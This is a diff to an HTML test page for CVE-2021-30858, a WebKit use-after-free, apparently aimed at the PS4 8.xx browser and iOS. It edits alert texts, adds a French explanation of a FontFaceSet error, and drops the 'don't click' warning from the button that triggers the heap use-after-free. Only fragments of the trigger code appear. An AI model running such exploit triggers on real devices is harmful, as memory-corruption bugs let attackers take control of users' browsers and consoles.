@@ -24,14 +24,14 @@
             frame.contentWindow.focus();
             frame.contentDocument.addEventListener('keydown', () => {
             frame.remove();
-            alert("WEBKIT WORK!");
+            alert("The webkit works perfectly on your version!");
             });
         }
         
         
         async function testwebkit() {
             try{
-            alert("Testing CVE-2021-30858 on PS4 8.XX, Press OK ! (Work on IOS)");
+            alert("Testing CVE-2021-30858 on PS4 8.XX, Press OK ! (Work on IOS) \n Si vous obtenez ce message d'erreur : ReferenceError : FontFaceSet n'est pas défini. \n Cela signifie que l'exploit ne fonctionne pas sur votre firmware ou système.");
             let font = new FontFace('font1', 'url()',{});
             alert("FontFace(). Test 1 OK!");
             var fontFaceSet = new FontFaceSet([font]);
@@ -65,8 +65,8 @@
         <br>
         <button class="button" onclick="testwebkit()">CVE ON PS4 Browser 8.XX</button>
             <button class="button" onclick="testwebkit2()">WEBKIT TEST (PS4, iOS)</button><br>
-            <button class="button" onclick="cve()">Webkit heap-use-after-free (don't click)</button><br>
-                    <p2 style="color:#E6E6FA">CVE-2021-30858: Use-after-free in WebKit / Credit: @KameleonRe</p2>
+            <button class="button" onclick="cve()">Webkit heap-use-after-free</button><br>
+                    <p2 style="color:#E6E6FA">Webkit: Use-after-free and Webkit: heap-use-after-free / Credit: @KameleonRe</p2>
         </center>
     </body>
 </html>
